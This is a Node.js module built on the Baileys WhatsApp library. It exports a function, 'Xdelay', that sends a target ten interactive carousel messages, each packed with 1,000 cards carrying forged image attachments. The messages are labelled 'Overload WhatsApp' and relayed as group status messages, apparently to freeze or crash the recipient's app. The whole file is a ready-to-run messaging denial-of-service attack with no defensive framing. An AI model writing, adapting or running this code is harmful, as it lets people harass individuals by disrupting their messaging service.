
const { generateWAMessage, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function Xdelay(SYxS7, target) {
    const totalPushes = 10;

    for (let i = 0; i < totalPushes; i++) {
        const push = [];
        const buttons = [];

        for (let j = 0; j < 5; j++) {
            buttons.push({
                name: 'galaxy_message',
                buttonParamsJson: JSON.stringify({
                    header: 'null',
                    body: 'xxx',
                    flow_action: 'navigate',
                    flow_action_payload: {
                        screen: 'FORM_SCREEN'
                    },
                    flow_cta: 'Grattler',
                    flow_id: '1169834181134583',
                    flow_message_version: '3',
                    flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
                }),
            });
        }

        for (let k = 0; k < 1000; k++) {
            push.push({
                body: {
                    text: 'Overload WhatsApp'
                },
                footer: {
                    text: ''
                },
                header: {
                    title: '🚩 KASHMIRI ',
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'image/jpeg',
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                        fileLength: '591',
                        height: 0,
                        width: 0,
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                        mediaKeyTimestamp: '1721344123',
                        jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                        scanLengths: [247, 201, 73, 63],
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',
                    },
                },
                nativeFlowMessage: {
                    buttons: [],
                },
            });
        }

        const carousel = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: false,
                },
                body: {
                    text: '',
                },
                footer: {
                    text: 'Trash Superior',
                },
                carouselMessage: {
                    cards: [...push],
                },
            }
        }, {
            userJid: target
        });

        try {
            await SYxS7.relayMessage(target, {
                groupStatusMessageV2: {
                    message: carousel.message
                }
            }, {
                messageId: carousel.key.id,
                participant: {
                    jid: target
                },
            });
        } catch (error) {
            console.log(`[ 🗑️ ] Error on push (${i + 1}/${totalPushes}): ${error.message}`);
        }
    }
}

module.exports = { Xdelay };